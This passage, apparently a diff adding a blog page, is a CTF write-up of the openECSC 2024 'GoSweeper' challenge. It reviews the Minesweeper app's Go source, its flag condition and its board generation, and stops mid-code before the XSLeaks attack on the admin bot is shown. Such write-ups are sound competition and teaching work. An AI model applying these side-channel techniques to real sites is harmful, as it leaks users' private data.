@@ -1,0 +1,1257 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+<meta charset="utf-8" />
+<meta http-equiv="x-ua-compatible" content="ie=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta name="base" content="https://parnianlali.github.io" />
+<meta name="HandheldFriendly" content="True" />
+<meta name="mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="default" />
+
+<meta name="referrer" content="no-referrer-when-downgrade">
+
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500|Nunito&amp;display=swap" rel="stylesheet" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://parnianlali.github.io/common.css?h=5973d4556e23e9912129" />
+<link rel="stylesheet" href="https://parnianlali.github.io/blog.css?h=e3b0c44298fc1c149afb" /><meta name="robots" content="index, follow" />
+  <meta name="googlebot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+  <meta name="bingbot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+  <link rel="icon" href="https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;icooo.54ae9a801d66ff54.png" type="image/png">
+  <title>openECSC 2024 Round 2 Write-up: GoSweeper | Parnian Lali</title>
+  <meta property="og:title" content="openECSC 2024 Round 2 Write-up: GoSweeper" />
+  <meta name="twitter:title" content="openECSC 2024 Round 2 Write-up: GoSweeper" />
+  <meta name="copyright" content="Parnian Lali" />
+  <meta name="description" content="This is a write-up of the “GoSweeper” challenge from Round 2 of openECSC 2024.
+This challenge gives us a glimpse of side channels on the web, which allow
+us to infer information which we otherwise would not have access to." />
+  <meta property="og:description" content="This is a write-up of the “GoSweeper” challenge from Round 2 of openECSC 2024.
+This challenge gives us a glimpse of side channels on the web, which allow
+us to infer information which we otherwise would not have access to." />
+  <meta name="twitter:description" content="This is a write-up of the “GoSweeper” challenge from Round 2 of openECSC 2024.
+This challenge gives us a glimpse of side channels on the web, which allow
+us to infer information which we otherwise would not have access to." />
+  <link rel="canonical" href="https://parnianlali.github.io/blog/openecsc-round2-writeup-gosweeper/" />
+  <meta property="og:url" content="https://parnianlali.github.io/blog/openecsc-round2-writeup-gosweeper/" />
+  <meta name="twitter:url" content="https://parnianlali.github.io/blog/openecsc-round2-writeup-gosweeper/" />
+  <meta name="twitter:card" content="summary" />
+  <meta property="og:site_name" content="Parnian Lali" />
+  <meta property="og:locale" content="en_US" />
+  <meta property="og:type" content="website" />
+  <meta property="og:updated_time" content="2024-05-04" /><link rel="alternate" type="application/atom+xml" title="Atom Feed" href="https://parnianlali.github.io/blog/atom.xml" /><link rel="alternate" type="application/rss+xml" title="RSS Feed" href="https://parnianlali.github.io/blog/rss.xml" />
+    
+    <link rel="icon" type="image/png" href="&#x2F;assets&#x2F;images&#x2F;icooo.png">
+    
+
+  </head>
+  <body>
+    <header>
+<nav>
+  <div>
+    <button id="drawer-open" class="icon-button" aria-label="Open Navigation Drawer">
+      <svg focusable="false" viewBox="0 0 24 24" aria-hidden="true"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"></path></svg>
+
+    </button>
+    <h1><a href="https://parnianlali.github.io/#top">Parnian Lali</a></h1>
+  </div>
+  <div>
+    <a class="button--big" href="https:&#x2F;&#x2F;parnianlali.github.io">
+      Home
+    </a>
+    <a class="button--big" href="https:&#x2F;&#x2F;github.com&#x2F;parnianlali&#x2F;CV">
+      CV
+    </a>
+  </div>
+</nav>
+<dialog id="navbar-drawer">
+  <button id="drawer-close" class="icon-button" aria-label="Close Navigation Drawer">
+    <svg aria-hidden="true" viewBox="0 0 24 24" focusable="false"><path d="M18.3 5.71a.9959.9959 0 0 0-1.41 0L12 10.59 7.11 5.7a.9959.9959 0 0 0-1.41 0c-.39.39-.39 1.02 0 1.41L10.59 12 5.7 16.89c-.39.39-.39 1.02 0 1.41.39.39 1.02.39 1.41 0L12 13.41l4.89 4.89c.39.39 1.02.39 1.41 0 .39-.39.39-1.02 0-1.41L13.41 12l4.89-4.89c.38-.38.38-1.02 0-1.4z"></path></svg>
+
+  </button>
+  <div class="navbar-drawer-links">
+    <a class="button--big" href="https:&#x2F;&#x2F;parnianlali.github.io">
+      Home
+    </a>
+    <a class="button--big" href="https:&#x2F;&#x2F;github.com&#x2F;parnianlali&#x2F;CV">
+      CV
+    </a>
+  </div>
+</dialog>
+<div id="navbar-trigger" style="position: absolute; width: 1px; height: 1px; top: 100px; left: 0;"></div>
+    </header>
+    <main id="top">
+
+<div class="container post">
+  <a class="back" href=https://parnianlali.github.io/blog>Back to post list</a>
+  <article>
+    <header>
+      <h1>openECSC 2024 Round 2 Write-up: GoSweeper</h1>
+      <span>2024-05-04 &middot; 19 minute read</span>
+      <p>
+        <a href="https://parnianlali.github.io/tags/ctf/">#ctf</a>
+        <a href="https://parnianlali.github.io/tags/ctf-writeup/">#ctf-writeup</a>
+        <a href="https://parnianlali.github.io/tags/web/">#web</a>
+        <a href="https://parnianlali.github.io/tags/golang/">#golang</a>
+        <a href="https://parnianlali.github.io/tags/xsleaks/">#xsleaks</a>
+      </p>
+    </header>
+    <div>
+      
+      <div class="preface">
+        <em>This write-up was placed in the top 3 of the best write-up competition for
+openECSC 2024 Round 2, and is now
+<a rel="noopener nofollow noreferrer" target="_blank" href="https://ecsc2024.it/openECSC/round-2/writeups/gosweeper">published on their website</a>
+as well.</em></p>
+<hr />
+
+      </div>
+      
+      
+      <div class="table-of-contents">
+        <ul>
+          
+            <li>
+              <a href="https://parnianlali.github.io/blog/openecsc-round2-writeup-gosweeper/#the-challenge">The Challenge</a>
+                
+            </li>
+          
+            <li>
+              <a href="https://parnianlali.github.io/blog/openecsc-round2-writeup-gosweeper/#investigating-attack-vectors">Investigating Attack Vectors</a>
+                
+                <ul>
+                  
+                  <li>
+                    <a href="https://parnianlali.github.io/blog/openecsc-round2-writeup-gosweeper/#cross-site-scripting-xss">Cross-Site Scripting (XSS)</a>
+                  </li>
+                  
+                  <li>
+                    <a href="https://parnianlali.github.io/blog/openecsc-round2-writeup-gosweeper/#server-side-template-injection-ssti">Server-Side Template Injection (SSTI)</a>
+                  </li>
+                  
+                  <li>
+                    <a href="https://parnianlali.github.io/blog/openecsc-round2-writeup-gosweeper/#redirect-middleware">Redirect Middleware</a>
+                  </li>
+                  
+                  <li>
+                    <a href="https://parnianlali.github.io/blog/openecsc-round2-writeup-gosweeper/#admin-bot">Admin Bot</a>
+                  </li>
+                  
+                </ul>
+                
+            </li>
+          
+            <li>
+              <a href="https://parnianlali.github.io/blog/openecsc-round2-writeup-gosweeper/#taking-control-of-the-admin-bot">Taking Control of the Admin Bot</a>
+                
+                <ul>
+                  
+                  <li>
+                    <a href="https://parnianlali.github.io/blog/openecsc-round2-writeup-gosweeper/#xsleaks">XSLeaks</a>
+                  </li>
+                  
+                </ul>
+                
+            </li>
+          
+            <li>
+              <a href="https://parnianlali.github.io/blog/openecsc-round2-writeup-gosweeper/#tying-it-all-together">Tying It All Together</a>
+                
+                <ul>
+                  
+                  <li>
+                    <a href="https://parnianlali.github.io/blog/openecsc-round2-writeup-gosweeper/#play-strategies">Play Strategies</a>
+                  </li>
+                  
+                </ul>
+                
+            </li>
+          
+            <li>
+              <a href="https://parnianlali.github.io/blog/openecsc-round2-writeup-gosweeper/#final-remarks">Final Remarks</a>
+                
+            </li>
+          
+        </ul>
+      </div>
+      
+      <p>This is a write-up of the “GoSweeper” challenge from Round 2 of openECSC 2024.
+This challenge gives us a glimpse of side channels on the web, which allow
+us to infer information which we otherwise would not have access to.</p>
+<span id="continue-reading"></span>
+<p>This class of vulnerabilities is called Cross-Site Leaks (or more commonly, <a rel="noopener nofollow noreferrer" target="_blank" href="https://xsleaks.dev">XSLeaks</a>),
+and, sorry for the spoiler, is what we will be taking advantage of in order to get
+the flag.</p>
+<p>This write-up will be an insight into how I approached this problem and successfully
+solved it, taking way more time than I would like to admit.
+With that said, there is a lot of Minesweeper gameplay ahead of us, but first, we have
+to dissect the source code that is given to us.</p>
+<p><em>Throughout this write-up, the URLs of the challenge and the attacker-controlled website
+are referred to as <code>https://gosweeper.example</code> and <code>https://attacker.example</code> respectively.</em></p>
+<h2 id="the-challenge">The Challenge</h2>
+<p>Let’s start by taking a look at the challenge, which provides us with a zip file and
+a challenge URL.</p>
+<p>Upon loading the URL, we are greeted with a landing page where we can either login or
+register.
+Clicking the register button immediately creates a new user and shows us its ID
+(a 128-bit hex string).
+Going back to the landing page reveals a counter of games won (along with total games),
+as well as a play button.
+Starting a new game reveals a 7x7 board without any initial discovered tiles, as well
+as two buttons under it, “Check win” and “Admin check”.
+Easy enough, I thought, I have played a lot of Minesweeper before.
+After playing a few games, I came to the conclusion that guessing the first tile correctly
+is quite difficult, and winning the game is borderline impossible, since there are multiple
+50/50 situations.
+Additionally, there seemed to be a lot of mines, more than you would expect for a board that
+small.</p>
+<figure><a href=".&#x2F;gosweeper-interface.png" class="img-fullscreen-link" target="_blank">
+    <img
+      src=".&#x2F;gosweeper-interface.png"
+      srcset="https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;gosweeper-interface.31bfec6f32fd3502.webp 1900w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;gosweeper-interface.a4cdf83b587ffe0a.webp 1800w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;gosweeper-interface.5f0055981ef3787b.webp 1700w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;gosweeper-interface.9cf71d777d652572.webp 1600w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;gosweeper-interface.606e56349b611027.webp 1500w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;gosweeper-interface.8b9e4c910ad1c778.webp 1400w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;gosweeper-interface.2fcdb3a6ab77e60e.webp 1300w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;gosweeper-interface.c4d11e64b5b1fca9.webp 1200w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;gosweeper-interface.622dca8be05f217d.webp 1100w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;gosweeper-interface.eb1410f24a35a818.webp 1000w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;gosweeper-interface.cb391e707afb6d94.webp 900w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;gosweeper-interface.ce3bde708dd57aa7.webp 800w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;gosweeper-interface.25c5976adb195796.webp 700w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;gosweeper-interface.8c8ba553d19794e9.webp 600w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;gosweeper-interface.d1f4c3ddfc3d811c.webp 500w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;gosweeper-interface.b23f6d7646c07109.webp 400w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;gosweeper-interface.4f71b3190147a75b.webp 300w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;gosweeper-interface.d1d43e190056f10e.webp 200w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;gosweeper-interface.7964fc74a3b8e7d8.webp 100w ,https:&#x2F;&#x2F;parnianlali.github.io&#x2F;processed_images&#x2F;gosweeper-interface.9ebd977eeaf85fc1.webp 1920w"
+      alt="Top left: landing page; Top center: register success page; Top right: logged-in home page; Bottom: board page"
+      width="1920"
+      loading="lazy"
+      decoding="async"
+    />
+  </a><figcaption>Top left: landing page; Top center: register success page; Top right: logged-in home page; Bottom: board page</figcaption></figure>
+<p>Having gotten a grasp of the web interface, it is now time to look into the source code
+that was given to us.
+Extracting the zip archive reveals that it contains a Docker setup (thanks) and a
+Golang application consisting of a single Go file and multiple HTML templates.</p>
+<pre style="background-color:#2b2c2f;color:#cccece;"><code><span>.
+</span><span>├── docker-compose.yml
+</span><span>├── Dockerfile
+</span><span>├── README.md
+</span><span>└── src
+</span><span>   ├── go.mod
+</span><span>   ├── go.sum
+</span><span>   ├── main.go
+</span><span>   └── templates
+</span><span>      ├── board.html
+</span><span>      ├── clone.html
+</span><span>      ├── header.html
+</span><span>      ├── home.html
+</span><span>      ├── login.html
+</span><span>      └── register.html
+</span></code></pre>
+<p>I have to preface the rest of this write-up by saying that I have little to no experience
+with Golang, but the challenge code is quite easy to read, and fortunately no weird
+Go shenanigans were required (I’m thankful for sane languages sometimes; looking at you
+JavaScript).</p>
+<p>My first instinct when approaching web challenges with source is to <em>grep</em> for the flag,
+which usually gives us a very good overview of the direction we need to take.
+This challenge is no different, and we found the following in the Go file:</p>
+<pre data-lang="go" style="background-color:#2b2c2f;color:#cccece;" class="language-go "><code class="language-go" data-lang="go"><span style="color:#c594c5;">var </span><span>FLAG </span><span style="color:#fac863;">string </span><span style="color:#5fb3b3;">= </span><span>os</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">Getenv</span><span style="color:#5fb3b3;">(&quot;</span><span style="color:#99c794;">FLAG</span><span style="color:#5fb3b3;">&quot;)
+</span><span style="color:#5f6364;">// ...
+</span><span>
+</span><span style="color:#c594c5;">func </span><span style="color:#6699cc;">homeHandler</span><span style="color:#5fb3b3;">(</span><span style="color:#f99157;">w </span><span>http</span><span style="color:#5fb3b3;">.</span><span style="color:#c594c5;">ResponseWriter</span><span style="color:#5fb3b3;">, </span><span style="color:#f99157;">r </span><span style="color:#5fb3b3;">*</span><span>http</span><span style="color:#5fb3b3;">.</span><span style="color:#c594c5;">Request</span><span style="color:#5fb3b3;">) {
+</span><span>  userid</span><span style="color:#5fb3b3;">, </span><span>points</span><span style="color:#5fb3b3;">, </span><span>tries</span><span style="color:#5fb3b3;">, </span><span>err </span><span style="color:#5fb3b3;">:= </span><span style="color:#6699cc;">getUserAndPoints</span><span style="color:#5fb3b3;">(</span><span>r</span><span style="color:#5fb3b3;">)
+</span><span>  </span><span style="color:#5f6364;">// ...
+</span><span>
+</span><span>  flag </span><span style="color:#5fb3b3;">:= &quot;&quot;
+</span><mark style="background-color:#3e4044;"><span>  </span><span style="color:#c594c5;">if </span><span>points </span><span style="color:#5fb3b3;">&gt;= </span><span style="color:#f99157;">20 </span><span style="color:#5fb3b3;">&amp;&amp; </span><span>points </span><span style="color:#5fb3b3;">== </span><span>tries </span><span style="color:#5fb3b3;">{
+</span></mark><span>    flag </span><span style="color:#5fb3b3;">= </span><span>FLAG
+</span><span>  </span><span style="color:#5fb3b3;">}
+</span><span>
+</span><span>  data </span><span style="color:#5fb3b3;">:= </span><span style="color:#c594c5;">struct </span><span style="color:#5fb3b3;">{
+</span><span>    </span><span style="color:#5f6364;">// ...
+</span><span>    Flag   </span><span style="color:#fac863;">string
+</span><span>  </span><span style="color:#5fb3b3;">}{
+</span><span>    </span><span style="color:#5f6364;">// ...
+</span><span>    Flag</span><span style="color:#5fb3b3;">:   </span><span>flag</span><span style="color:#5fb3b3;">,
+</span><span>  </span><span style="color:#5fb3b3;">}
+</span><span>
+</span><span>  </span><span style="color:#6699cc;">renderTemplate</span><span style="color:#5fb3b3;">(</span><span>w</span><span style="color:#5fb3b3;">, &quot;</span><span style="color:#99c794;">home.html</span><span style="color:#5fb3b3;">&quot;, </span><span>data</span><span style="color:#5fb3b3;">)
+</span><span style="color:#5fb3b3;">}
+</span></code></pre>
+<p>It seems like the flag is shown in the home page once we reach 20 <em>perfect</em> wins,
+which as mentioned before, is borderline impossible by just playing the game.
+Great.</p>
+<p>After quickly going through the source code, I found two important pieces of
+information: how the board is generated and what the “Admin check” button does.</p>
+<p>The function that generates the board is quite long, but here is a small recap
+of the algorithm:</p>
+<ol>
+<li>Randomly pick a position on the board to be the first bomb.</li>
+<li>Pick another random position on the board, and if is next to a bomb (orthogonally;
+diagonally does not count), place a bomb there.</li>
+<li>Repeat the previous step until half of the board is composed of bombs, that is,
+until there are 25 bombs in the board.</li>
+<li>Mark all safe spots neighboring more than 6 bombs as bombs as well (for sides
+the threshold is more than 3 bombs, while for corners it is more than 2),
+preventing a single safe spot surrounded by bombs.</li>
+</ol>
+<details>
+<summary>Full board generation code</summary>
+<pre data-lang="go" style="background-color:#2b2c2f;color:#cccece;" class="language-go "><code class="language-go" data-lang="go"><span style="color:#c594c5;">func </span><span style="color:#6699cc;">GenerateBoard</span><span style="color:#5fb3b3;">() []</span><span style="color:#fac863;">int </span><span style="color:#5fb3b3;">{
+</span><span>  board </span><span style="color:#5fb3b3;">:= </span><span style="color:#6699cc;">make</span><span style="color:#5fb3b3;">([]</span><span style="color:#fac863;">int</span><span style="color:#5fb3b3;">, </span><span>DIM</span><span style="color:#5fb3b3;">*</span><span>DIM</span><span style="color:#5fb3b3;">)
+</span><span>
+</span><span>  firsBombX </span><span style="color:#5fb3b3;">:= </span><span style="color:#6699cc;">randInt</span><span style="color:#5fb3b3;">(</span><span style="color:#f99157;">0</span><span style="color:#5fb3b3;">, </span><span style="color:#f99157;">1</span><span style="color:#5fb3b3;">) * (</span><span>DIM </span><span style="color:#5fb3b3;">- </span><span style="color:#f99157;">1</span><span style="color:#5fb3b3;">)
+</span><span>  firsBombY </span><span style="color:#5fb3b3;">:= </span><span style="color:#6699cc;">randInt</span><span style="color:#5fb3b3;">(</span><span style="color:#f99157;">0</span><span style="color:#5fb3b3;">, </span><span style="color:#f99157;">1</span><span style="color:#5fb3b3;">) * (</span><span>DIM </span><span style="color:#5fb3b3;">- </span><span style="color:#f99157;">1</span><span style="color:#5fb3b3;">)
+</span><span>
+</span><span>  firsBombInd </span><span style="color:#5fb3b3;">:= </span><span>firsBombX</span><span style="color:#5fb3b3;">*</span><span>DIM </span><span style="color:#5fb3b3;">+ </span><span>firsBombY
+</span><span>
+</span><span>  board</span><span style="color:#5fb3b3;">[</span><span>firsBombInd</span><span style="color:#5fb3b3;">] = </span><span style="color:#f99157;">100
+</span><span>
+</span><span>  </span><span style="color:#5f6364;">// put bombs around the first bomb
+</span><span>  </span><span style="color:#c594c5;">for </span><span>i </span><span style="color:#5fb3b3;">:= </span><span style="color:#f99157;">0</span><span style="color:#5fb3b3;">; </span><span>i </span><span style="color:#5fb3b3;">&lt; (</span><span>DIM </span><span style="color:#5fb3b3;">* </span><span>DIM </span><span style="color:#5fb3b3;">/ </span><span style="color:#f99157;">2</span><span style="color:#5fb3b3;">); </span><span>i</span><span style="color:#5fb3b3;">++ {
+</span><span>
+</span><span>    </span><span style="color:#5f6364;">// get random position
+</span><span>    randPos </span><span style="color:#5fb3b3;">:= </span><span style="color:#6699cc;">randInt</span><span style="color:#5fb3b3;">(</span><span style="color:#f99157;">0</span><span style="color:#5fb3b3;">, </span><span>DIM</span><span style="color:#5fb3b3;">*</span><span>DIM</span><span style="color:#5fb3b3;">-</span><span style="color:#f99157;">1</span><span style="color:#5fb3b3;">)
+</span><span>
+</span><span>    </span><span style="color:#5f6364;">// check if the position is already a bomb
+</span><span>    </span><span style="color:#c594c5;">if </span><span>board</span><span style="color:#5fb3b3;">[</span><span>randPos</span><span style="color:#5fb3b3;">] == </span><span style="color:#f99157;">100 </span><span style="color:#5fb3b3;">{
+</span><span>      i</span><span style="color:#5fb3b3;">--
+</span><span>      </span><span style="color:#c594c5;">continue
+</span><span>    </span><span style="color:#5fb3b3;">}
+</span><span>
+</span><span>    </span><span style="color:#5f6364;">// check if the position is close to another bomb
+</span><span>
+</span><span>    </span><span style="color:#5f6364;">// get x and y of the random position
+</span><span>    randX </span><span style="color:#5fb3b3;">:= </span><span>randPos </span><span style="color:#5fb3b3;">/ </span><span>DIM
+</span><span>    randY </span><span style="color:#5fb3b3;">:= </span><span>randPos </span><span style="color:#5fb3b3;">% </span><span>DIM
+</span><span>
+</span><span>    </span><span style="color:#5f6364;">// check up
+</span><span>    nearBomb </span><span style="color:#5fb3b3;">:= </span><span style="color:#f99157;">false
+</span><span>
+</span><span>    </span><span style="color:#c594c5;">if </span><span>randX </span><span style="color:#5fb3b3;">&gt; </span><span style="color:#f99157;">0 </span><span style="color:#5fb3b3;">&amp;&amp; </span><span>board</span><span style="color:#5fb3b3;">[</span><span>randPos</span><span style="color:#5fb3b3;">-</span><span>DIM</span><span style="color:#5fb3b3;">] == </span><span style="color:#f99157;">100 </span><span style="color:#5fb3b3;">{
+</span><span>      nearBomb </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">true
+</span><span>    </span><span style="color:#5fb3b3;">}
+</span><span>    </span><span style="color:#c594c5;">if </span><span>randX </span><span style="color:#5fb3b3;">&lt; (</span><span>DIM</span><span style="color:#5fb3b3;">-</span><span style="color:#f99157;">1</span><span style="color:#5fb3b3;">) &amp;&amp; </span><span>board</span><span style="color:#5fb3b3;">[</span><span>randPos</span><span style="color:#5fb3b3;">+</span><span>DIM</span><span style="color:#5fb3b3;">] == </span><span style="color:#f99157;">100 </span><span style="color:#5fb3b3;">{
+</span><span>      nearBomb </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">true
+</span><span>    </span><span style="color:#5fb3b3;">}
+</span><span>    </span><span style="color:#c594c5;">if </span><span>randY </span><span style="color:#5fb3b3;">&gt; </span><span style="color:#f99157;">0 </span><span style="color:#5fb3b3;">&amp;&amp; </span><span>board</span><span style="color:#5fb3b3;">[</span><span>randPos</span><span style="color:#5fb3b3;">-</span><span style="color:#f99157;">1</span><span style="color:#5fb3b3;">] == </span><span style="color:#f99157;">100 </span><span style="color:#5fb3b3;">{
+</span><span>      nearBomb </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">true
+</span><span>    </span><span style="color:#5fb3b3;">}
+</span><span>    </span><span style="color:#c594c5;">if </span><span>randY </span><span style="color:#5fb3b3;">&lt; (</span><span>DIM</span><span style="color:#5fb3b3;">-</span><span style="color:#f99157;">1</span><span style="color:#5fb3b3;">) &amp;&amp; </span><span>board</span><span style="color:#5fb3b3;">[</span><span>randPos</span><span style="color:#5fb3b3;">+</span><span style="color:#f99157;">1</span><span style="color:#5fb3b3;">] == </span><span style="color:#f99157;">100 </span><span style="color:#5fb3b3;">{
+</span><span>      nearBomb </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">true
+</span><span>    </span><span style="color:#5fb3b3;">}
+</span><span>
+</span><span>    </span><span style="color:#c594c5;">if </span><span>nearBomb </span><span style="color:#5fb3b3;">{
+</span><span>      board</span><span style="color:#5fb3b3;">[</span><span>randPos</span><span style="color:#5fb3b3;">] = </span><span style="color:#f99157;">100
+</span><span>    </span><span style="color:#5fb3b3;">} </span><span style="color:#c594c5;">else </span><span style="color:#5fb3b3;">{
+</span><span>      i</span><span style="color:#5fb3b3;">--
+</span><span>    </span><span style="color:#5fb3b3;">}
+</span><span>  </span><span style="color:#5fb3b3;">}
+</span><span>
+</span><span>  changed </span><span style="color:#5fb3b3;">:= </span><span style="color:#f99157;">true
+</span><span>
+</span><span>  </span><span style="color:#c594c5;">for </span><span>changed </span><span style="color:#5fb3b3;">{
+</span><span>    changed </span><span style="color:#5fb3b3;">= </span><span style="color:#f99157;">false
+</span><span>
+</span><span>    </span><span style="color:#5f6364;">// Fill the rest of the board with the number of bombs around
+</span><span>    </span><span style="color:#c594c5;">for </span><span>i </span><span style="color:#5fb3b3;">:= </span><span style="color:#f99157;">0</span><span style="color:#5fb3b3;">; </span><span>i </span><span style="color:#5fb3b3;">&lt; </span><span>DIM</span><span style="color:#5fb3b3;">*</span><span>DIM</span><span style="color:#5fb3b3;">; </span><span>i</span><span style="color:#5fb3b3;">++ {
+</span><span>      </span><span style="color:#c594c5;">if </span><span>board</span><span style="color:#5fb3b3;">[</span><span>i</span><span style="color:#5fb3b3;">] == </span><span style="color:#f99157;">100 </span><span style="color:#5fb3b3;">{
+</span><span>        </span><span style="color:#c594c5;">continue
+</span><span>      </span><span style="color:#5fb3b3;">}
+</span><span>
+</span><span>      x </span><span style="color:#5fb3b3;">:= </span><span>i </span><span style="color:#5fb3b3;">/ </span><span>DIM
+</span><span>      y </span><span style="color:#5fb3b3;">:= </span><span>i </span><span style="color:#5fb3b3;">% </span><span>DIM
+</span><span>
+</span><span>      count </span><span style="color:#5fb3b3;">:= </span><span style="color:#f99157;">0
+</span><span>
+</span><span>      </span><span style="color:#c594c5;">if </span><span>x </span><span style="color:#5fb3b3;">&gt; </span><span style="color:#f99157;">0 </span><span style="color:#5fb3b3;">{
+</span><span>
+</span><span>        </span><span style="color:#5f6364;">// check up
+</span><span>        </span><span style="color:#c594c5;">if </span><span>board</span><span style="color:#5fb3b3;">[</span><span>i</span><span style="color:#5fb3b3;">-</span><span>DIM</span><span style="color:#5fb3b3;">] == </span><span style="color:#f99157;">100 </span><span style="color:#5fb3b3;">{
+</span><span>          count</span><span style="color:#5fb3b3;">++
+</span><span>        </span><span style="color:#5fb3b3;">}
+</span><span>        </span><span style="color:#5f6364;">// check up left
+</span><span>        </span><span style="color:#c594c5;">if </span><span>y </span><span style="color:#5fb3b3;">&gt; </span><span style="color:#f99157;">0 </span><span style="color:#5fb3b3;">&amp;&amp; </span><span>board</span><span style="color:#5fb3b3;">[</span><span>i</span><span style="color:#5fb3b3;">-(</span><span>DIM</span><span style="color:#5fb3b3;">+</span><span style="color:#f99157;">1</span><span style="color:#5fb3b3;">)] == </span><span style="color:#f99157;">100 </span><span style="color:#5fb3b3;">{
+</span><span>          count</span><span style="color:#5fb3b3;">++
+</span><span>        </span><span style="color:#5fb3b3;">}
+</span><span>        </span><span style="color:#5f6364;">// check up right
+</span><span>        </span><span style="color:#c594c5;">if </span><span>y </span><span style="color:#5fb3b3;">&lt; (</span><span>DIM</span><span style="color:#5fb3b3;">-</span><span style="color:#f99157;">1</span><span style="color:#5fb3b3;">) &amp;&amp; </span><span>board</span><span style="color:#5fb3b3;">[</span><span>i</span><span style="color:#5fb3b3;">-(</span><span>DIM</span><span style="color:#5fb3b3;">-</span><span style="color:#f99157;">1</span><span style="color:#5fb3b3;">)] == </span><span style="color:#f99157;">100 </span><span style="color:#5fb3b3;">{
+</span><span>          count</span><span style="color:#5fb3b3;">++
+</span><span>        </span><span style="color:#5fb3b3;">}
+</span><span>      </span><span style="color:#5fb3b3;">}
+</span><span>      </span><span style="color:#c594c5;">if </span><span>x </span><span style="color:#5fb3b3;">&lt; (</span><span>DIM </span><span style="color:#5fb3b3;">- </span><span style="color:#f99157;">1</span><span style="color:#5fb3b3;">) {
+</span><span>
+</span><span>        </span><span style="color:#5f6364;">// check down
+</span><span>        </span><span style="color:#c594c5;">if </span><span>board</span><span style="color:#5fb3b3;">[</span><span>i</span><span style="color:#5fb3b3;">+</span><span>DIM</span><span style="color:#5fb3b3;">] == </span><span style="color:#f99157;">100 </span><span style="color:#5fb3b3;">{
+</span><span>          count</span><span style="color:#5fb3b3;">++
+</span><span>        </span><span style="color:#5fb3b3;">}
+</span><span>        </span><span style="color:#5f6364;">// check down left
+</span><span>        </span><span style="color:#c594c5;">if </span><span>y </span><span style="color:#5fb3b3;">&gt; </span><span style="color:#f99157;">0 </span><span style="color:#5fb3b3;">&amp;&amp; </span><span>board</span><span style="color:#5fb3b3;">[</span><span>i</span><span style="color:#5fb3b3;">+</span><span>DIM</span><span style="color:#5fb3b3;">-</span><span style="color:#f99157;">1</span><span style="color:#5fb3b3;">] == </span><span style="color:#f99157;">100 </span><span style="color:#5fb3b3;">{
+</span><span>          count</span><span style="color:#5fb3b3;">++
+</span><span>        </span><span style="color:#5fb3b3;">}
+</span><span>        </span><span style="color:#5f6364;">// check down right
+</span><span>        </span><span style="color:#c594c5;">if </span><span>y </span><span style="color:#5fb3b3;">&lt; (</span><span>DIM</span><span style="color:#5fb3b3;">-</span><span style="color:#f99157;">1</span><span style="color:#5fb3b3;">) &amp;&amp; </span><span>board</span><span style="color:#5fb3b3;">[</span><span>i</span><span style="color:#5fb3b3;">+</span><span>DIM</span><span style="color:#5fb3b3;">+</span><span style="color:#f99157;">1</span><span style="color:#5fb3b3;">] == </span><span style="color:#f99157;">100 </span><span style="color:#5fb3b3;">{
+</span><span>          count</span><span style="color:#5fb3b3;">++
+</span><span>        </span><span style="color:#5fb3b3;">}
+</span><span>      </span><span style="color:#5fb3b3;">}
+</span><span>      </span><span style="color:#5f6364;">// check left
+</span><span>      </span><span style="color:#c594c5;">if </span><span>y </span><span style="color:#5fb3b3;">&gt; </span><span style="color:#f99157;">0 </span><span style="color:#5fb3b3;">&amp;&amp; </span><span>board</span><span style="color:#5fb3b3;">[</span><span>i</span><span style="color:#5fb3b3;">-</span><span style="color:#f99157;">1</span><span style="color:#5fb3b3;">] == </span><span style="color:#f99157;">100 </span><span style="color:#5fb3b3;">{
+</span><span>        count</span><span style="color:#5fb3b3;">++
+</span><span>      </span><span style="color:#5fb3b3;">}
+</span><span>      </span><span style="color:#5f6364;">// check right
+</span><span>      </span><span style="color:#c594c5;">if </span><span>y </span><span style="color:#5fb3b3;">&lt; (</span><span>DIM</span><span style="color:#5fb3b3;">-</span><span style="color:#f99157;">1</span><span style="color:#5fb3b3;">) &amp;&amp; </span><span>board</span><span style="color:#5fb3b3;">[</span><span>i</span><span style="color:#5fb3b3;">+</span><span style="color:#f99157;">1</span><span style="color:#5fb3b3;">] == </span><span style="color:#f99157;">100 </span><span style="color:#5fb3b3;">{
+</span><span>        count</span><span style="color:#5fb3b3;">++
